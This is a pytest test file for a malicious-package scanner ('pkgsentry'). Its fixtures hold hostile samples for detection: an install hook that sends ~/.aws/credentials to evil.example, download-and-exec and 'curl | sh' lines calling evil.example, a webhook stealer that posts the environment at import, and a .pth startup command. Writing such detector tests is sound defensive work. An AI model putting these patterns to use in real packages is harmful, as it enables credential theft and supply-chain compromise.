from pathlib import Path
from textwrap import dedent

from pkgsentry.analyzers.hooks import find_hooks
from pkgsentry.analyzers.rules import Finding, check_code
from pkgsentry.analyzers.typosquat import Popular
from pkgsentry.cli import format_code

POPULAR = (Popular("requests", 1, 10**9),)


def scan(root: Path, files: dict[str, str], kind: str = "sdist") -> list[Finding]:
    for name, text in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(dedent(text))
    return check_code(root, kind, find_hooks(root, "demo", kind, POPULAR))


def summary(findings, *, hide_info=True):
    return sorted((f.rule, f.context, f.strength) for f in findings if not (hide_info and f.strength == "info"))


def test_install_hook_that_steals_credentials(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/setup.py": """\
        import os, urllib.request
        from setuptools import setup
        from setuptools.command.install import install

        class Evil(install):
            def run(self):
                secrets = open(os.path.expanduser("~/.aws/credentials")).read()
                urllib.request.urlopen("https://evil.example/collect", secrets.encode())
                install.run(self)

        setup(name="demo", cmdclass={"install": Evil})
        """})
    assert summary(findings) == [
        ("network", "install", "medium"),
        ("secret", "install", "medium"),
        ("secret + network", "install", "strong"),
    ]
    assert next(f for f in findings if f.rule == "secret").line == 7


def test_decoded_code_is_followed_through_variables(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/_core.py": """\
        import base64, zlib
        CODE = ''
        CODE += 'eJwrKCrNy0vMTVVIzs8rSc0rUSjJSFUoLs3JUcgsUShKzcnPS1coLkgtKk7MTMxLzS0BAA=='
        CODE = base64.b64decode(CODE)
        CODE = zlib.decompress(CODE)
        exec(CODE)
        """})
    assert summary(findings) == [("decoded exec", "import", "strong")]
    assert findings[0].evidence == "exec(CODE)"


def test_variables_are_followed_through_copies_but_not_across_functions(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import base64
        packed = base64.b64decode("cHJpbnQoMSk=")
        code = packed
        exec(code)

        def unpack(blob):
            data = base64.b64decode(blob)
            return data

        def run(data):
            exec(data)
        """})
    assert summary(findings, hide_info=False) == [("decoded exec", "import", "strong"), ("exec", "call", "info")]


def test_download_and_execute_is_strong_even_inside_a_function(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/update.py": """\
        import urllib.request
        def update():
            exec(urllib.request.urlopen("https://evil.example/stage2").read())
        """})
    assert ("decoded exec", "call", "strong") in summary(findings)


def test_honest_patterns_stay_quiet(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/setup.py": """\
            from setuptools import setup
            exec(open("demo/version.py").read())
            setup(name="demo")
            """,
        "demo-1.0/demo/tools.py": '''\
            """Docs: https://bit.ly/demo-docs and ~/.ssh/config are only mentioned here."""
            import os, subprocess, requests

            def describe():
                env = os.environ.copy()
                return subprocess.run(["git", "describe"], env=env)

            def fetch(url):
                return requests.get(url)
            ''',
    })
    assert summary(findings) == []
    assert summary(findings, hide_info=False) == [("network", "call", "info"), ("process", "call", "info")]


def test_context_follows_when_code_runs(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/demo/__init__.py": """\
            import requests
            requests.get("https://example.org/a")

            def helper():
                requests.get("https://example.org/b")

            def unused():
                requests.get("https://example.org/c")

            class Client:
                def get(self):
                    requests.get("https://example.org/d")

            helper()
            if __name__ == "__main__":
                requests.get("https://example.org/e")
            """,
        "demo-1.0/tests/test_demo.py": "import requests\nrequests.get('https://example.org/f')\n",
    })
    contexts = sorted((Path(f.path).name, f.line, f.context) for f in findings if f.rule == "network")
    assert contexts == [
        ("__init__.py", 2, "import"), ("__init__.py", 5, "import"), ("__init__.py", 8, "call"),
        ("__init__.py", 12, "call"), ("__init__.py", 16, "call"), ("test_demo.py", 2, "dev"),
    ]


def test_naming_a_function_does_not_run_it(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import requests
        def handler():
            requests.get("https://example.org")
        HANDLERS = {"x": handler}
        alias = handler
        """})
    assert summary(findings, hide_info=False) == [("network", "call", "info")]


def test_stealer_shape_constant_webhook_sent_at_import(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import json, os, threading, requests
        WEBHOOK = "https://discord.com/api/webhooks/000/token"

        def _send():
            requests.post(WEBHOOK, data=json.dumps(dict(os.environ)))

        threading.Thread(target=_send).start()
        """})
    assert summary(findings) == [
        ("endpoint", "call", "weak"),
        ("endpoint + network", "import", "strong"),
        ("environment", "import", "medium"),
        ("network", "import", "medium"),
        ("secret + network", "import", "strong"),
    ]


def test_script_guards_and_files_that_are_not_installed(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/demo/__init__.py": "",
        "demo-1.0/demo/cli.py": """\
            import sys, subprocess
            if sys.platform != "win32" and __name__ == "__main__":
                subprocess.run(["id"])
            """,
        "demo-1.0/scripts/release_helper.py": "import subprocess\nsubprocess.run(['git', 'tag'])\n",
        "demo-1.0/src/nsparent/child/__init__.py": "import subprocess\nsubprocess.run(['uname'])\n",
    })
    assert sorted((f.path, f.context) for f in findings) == [
        ("demo-1.0/demo/cli.py", "call"),
        ("demo-1.0/scripts/release_helper.py", "dev"),
        ("demo-1.0/src/nsparent/child/__init__.py", "import"),
    ]


def test_disguised_calls_are_resolved(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import os
        import subprocess as sp
        from os import system as run_it
        sp.Popen(["id"])
        run_it("id")
        __import__("os").system("id")
        getattr(os, "system")("id")
        """})
    assert [(f.line, f.detail) for f in findings] == [
        (4, "starts another program (subprocess.Popen)"),
        (5, "starts another program (os.system)"),
        (6, "starts another program (os.system)"),
        (7, "starts another program (os.system)"),
    ]


def test_code_inside_an_exec_string_is_checked(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": "exec(\"import os; os.system('id')\")\n"})
    assert [(f.rule, f.context, f.detail) for f in findings] == [
        ("process", "import", "starts another program (os.system) inside a code string")
    ]


def test_pth_startup_code_is_checked(tmp_path):
    findings = scan(tmp_path, {"demo.pth": "import os; os.system('id')\n", "demo/__init__.py": ""}, kind="wheel")
    assert summary(findings) == [("process", "startup", "strong")]


def test_endpoints(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/setup.py": """\
            import socket
            from setuptools import setup
            HOOK = "https://discord.com/api/webhooks/000/token"
            socket.create_connection(("1.1.1.1", 4444))
            setup(name="demo")
            """,
        "demo-1.0/demo/links.py": """\
            def links():
                return ["https://bit.ly/abc", "http://1.1.1.1/x", "http://127.0.0.1:8000",
                        "https://discord.com/invite/demo", "https://abc.ngrok-free.app/x"]
            """,
    })
    assert summary(findings, hide_info=False) == [
        ("endpoint", "call", "weak"),
        ("endpoint", "call", "weak"),
        ("endpoint", "call", "weak"),
        ("endpoint", "install", "strong"),
        ("endpoint + network", "install", "strong"),
        ("network", "install", "medium"),
        ("short link", "call", "info"),
    ]


def test_secret_and_persistence_strings(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/demo/__init__.py": "KEY = '~/.ssh/id_rsa'\nHOSTS = '~/.ssh/known_hosts'\n",
        "demo-1.0/demo/shell.py": "def install_completion():\n    return open('~/.bashrc', 'a')\n",
    })
    assert summary(findings) == [("persistence", "call", "weak"), ("secret", "call", "weak")]


def test_credential_environment_variables_count_only_when_read(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import os
        from collections import namedtuple
        Creds = namedtuple("Creds", ["aws_session_token"])
        TOKEN = os.environ["GITHUB_TOKEN"]
        KEY = os.getenv("AWS_SECRET_ACCESS_KEY")
        """})
    assert [(f.line, f.rule, f.context, f.strength) for f in findings] == [
        (4, "secret", "import", "weak"), (5, "secret", "import", "weak"),
    ]


def test_risky_commands(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/setup.py": """\
            import os
            from setuptools import setup
            os.system("curl -s https://evil.example/x.sh | sh")
            setup(name="demo")
            """,
        "demo-1.0/demo/__init__.py": "def hint():\n    print('Install it with: curl -sSL https://example.org/i.sh | bash')\n",
    })
    assert summary(findings) == [
        ("process", "install", "weak"), ("risky command", "call", "weak"), ("risky command", "install", "strong"),
    ]


def test_creating_a_client_is_not_network_traffic(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import socket, requests
        probe = socket.socket(socket.AF_INET6)
        session = requests.Session()
        with requests.Session() as s:
            s.post("https://example.org/upload")
        conn = socket.socket()
        conn.connect(("example.org", 443))

        class Client:
            def __init__(self):
                self.http = requests.Session()
            def send(self):
                return self.http.post("https://example.org/x")
        """})
    assert [(f.line, f.detail) for f in findings] == [
        (5, "uses the network (requests.Session(...).post)"),
        (7, "uses the network (socket.socket(...).connect)"),
        (13, "uses the network (requests.Session(...).post)"),
    ]


def test_callbacks_and_scheduled_functions(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import atexit, requests
        def retrieve(uri):
            return requests.get(uri)
        REGISTRY = dict(retrieve=retrieve)
        Registry = object
        Registry(retrieve)

        @atexit.register
        def goodbye():
            requests.post("https://example.org/bye")
        """})
    assert sorted((f.line, f.context) for f in findings) == [(3, "call"), (10, "import")]


def test_whole_environment_versus_one_variable(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import json, os, requests
        if "vagrant" in str(os.environ):
            pass
        home = json.dumps(os.environ.get("HOME"))
        blob = json.dumps(dict(os.environ))
        requests.post("https://example.org/c", json=os.environ.copy())
        """})
    assert [(f.line, f.rule) for f in findings if f.rule == "environment"] == [(5, "environment"), (6, "environment")]


def test_helper_folders_and_scripts_in_an_sdist(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/demo/__init__.py": "from demo_cmds.run import main\n",
        "demo-1.0/demo_cmds/run.py": "import subprocess\nsubprocess.run(['id'])\n",
        "demo-1.0/resources/make_pr.py": "import subprocess\nsubprocess.run(['gh', 'pr'])\n",
        "demo-1.0/python/demo_ext/__init__.py": "import subprocess\nsubprocess.run(['uname'])\n",
        "demo-1.0/bump-version.py": "import subprocess\nsubprocess.run(['git', 'tag'])\n",
        "demo-1.0/src_tools.py": "import subprocess\nsubprocess.run(['make'])\n",
        "demo-1.0/demo/_tests/helpers.py": "import subprocess\nsubprocess.run(['true'])\n",
    })
    assert sorted((f.path.split("/", 1)[1], f.context) for f in findings) == [
        ("bump-version.py", "dev"),
        ("demo/_tests/helpers.py", "dev"),
        ("demo_cmds/run.py", "import"),
        ("python/demo_ext/__init__.py", "import"),
        ("resources/make_pr.py", "dev"),
        ("src_tools.py", "dev"),
    ]


def test_folder_names_are_not_a_hiding_place(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/tests/__init__.py": "import subprocess\nsubprocess.run(['id'])\n",
        "demo-1.0/demo/__init__.py": "from .samples import payload\nimport demo.docs.loader\nimport importlib\n"
                                     "importlib.import_module('demo.examples.hidden')\n"
                                     "exec(open('demo/benchmarks/run_me.py').read())\n",
        "demo-1.0/demo/samples/payload.py": "import subprocess\nsubprocess.run(['id'])\n",
        "demo-1.0/demo/docs/loader.py": "from demo.docs import stage2\n",
        "demo-1.0/demo/docs/stage2.py": "import subprocess\nsubprocess.run(['id'])\n",
        "demo-1.0/demo/docs/unused.py": "import subprocess\nsubprocess.run(['id'])\n",
        "demo-1.0/demo/examples/hidden.py": "import subprocess\nsubprocess.run(['id'])\n",
        "demo-1.0/demo/benchmarks/run_me.py": "import subprocess\nsubprocess.run(['id'])\n",
        "demo-1.0/demo/demos/notebook.py": "import subprocess\nsubprocess.run(['jupyter'])\n",
        "demo-1.0/action/main.py": "import subprocess\nsubprocess.run(['gh'])\n",
        "demo-1.0/demo/tests/test_action.py": "import action\n",
    })
    assert sorted((f.path.split("/", 1)[1], f.context) for f in findings if f.rule == "process") == [
        ("action/main.py", "dev"),
        ("demo/benchmarks/run_me.py", "import"),
        ("demo/demos/notebook.py", "dev"),
        ("demo/docs/stage2.py", "import"),
        ("demo/docs/unused.py", "dev"),
        ("demo/examples/hidden.py", "import"),
        ("demo/samples/payload.py", "import"),
        ("tests/__init__.py", "dev"),
    ]


def test_files_that_setup_py_imports_or_runs_by_name_are_install_code(tmp_path):
    findings = scan(tmp_path, {
        "demo-1.0/setup.py": """\
            from setuptools import setup
            from dev.helpers import version
            exec(open("resources/payload.py").read())
            setup(name="demo")
            """,
        "demo-1.0/dev/helpers.py": "import requests\nrequests.get('https://example.org')\n",
        "demo-1.0/resources/payload.py": "import requests\nrequests.get('https://example.org')\n",
        "demo-1.0/demo/__init__.py": "",
    })
    assert sorted((f.path.split("/", 1)[1], f.context) for f in findings if f.rule == "network") == [
        ("dev/helpers.py", "install"), ("resources/payload.py", "install"),
    ]


def test_build_tool_hooks_are_install_code(tmp_path):
    for backend, config, hook_file in [
        ("hatchling.build", "[tool.hatch.build.hooks.custom]\n", "hatch_build.py"),
        ("hatchling.build", "[tool.hatch.build.targets.wheel.hooks.custom]\npath = 'build/hook.py'\n", "build/hook.py"),
        ("pdm.backend", "", "pdm_build.py"),
        ("poetry.core.masonry.api", "[tool.poetry.build]\nscript = 'scripts/build_ext.py'\n", "scripts/build_ext.py"),
    ]:
        root = tmp_path / hook_file.replace("/", "_")
        findings = scan(root, {
            "demo-1.0/pyproject.toml": f'[build-system]\nbuild-backend = "{backend}"\n{config}',
            f"demo-1.0/{hook_file}": "import requests\nrequests.get('https://example.org')\n",
            "demo-1.0/demo/__init__.py": "",
        })
        assert [(f.rule, f.context) for f in findings] == [("network", "install")], hook_file


def test_marshal_alone_is_not_code_execution(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py": """\
        import marshal
        def load(data):
            return marshal.loads(data)
        def run(data):
            exec(marshal.loads(data))
        """})
    assert summary(findings, hide_info=False) == [("decoded exec", "call", "strong")]


def test_deeply_nested_code_does_not_crash_the_scanner(tmp_path):
    deep = "x = " + " + ".join(["1"] * 5000) + "\ny = " + ".".join(["a"] * 20000) + "\n"
    findings = scan(tmp_path, {"demo-1.0/setup.py": deep, "demo-1.0/demo/__init__.py": deep})
    assert isinstance(findings, list)


def test_secret_and_network_only_inside_a_called_function_is_weak(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/demo/sync.py": """\
        import requests
        def sync():
            key = open("/home/user/.aws/credentials").read()
            requests.post("https://example.org/backup", data=key)
        """})
    assert ("secret + network", "call", "weak") in summary(findings)


def test_python2_files_get_a_text_fallback(tmp_path):
    findings = scan(tmp_path, {"demo-1.0/setup.py": """\
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.0.2.1", 017620))
        except Exception,e:
            pass
        """})
    assert ("network", "install", "weak") in summary(findings)
    assert all("(text match)" in f.detail for f in findings)


def test_format_code_hides_info_and_defangs_indicators():
    findings = [
        Finding("endpoint", "demo/x.py", 3, "import", "strong", "points to a URL that uses a raw public IP address",
                "requests.post('https://evil.example/c', ip='203.0.113.5')"),
        Finding("network", "demo/y.py", 9, "call", "info", "uses the network (requests.get)", "requests.get(u)"),
    ]
    text = format_code("demo 1.0 (sdist)", findings)
    assert "hxxps://evil[.]example/c" in text and "203[.]0[.]113[.]5" in text
    assert "https://" not in text and "requests.get(u)" not in text
    assert "1 info findings not shown" in text
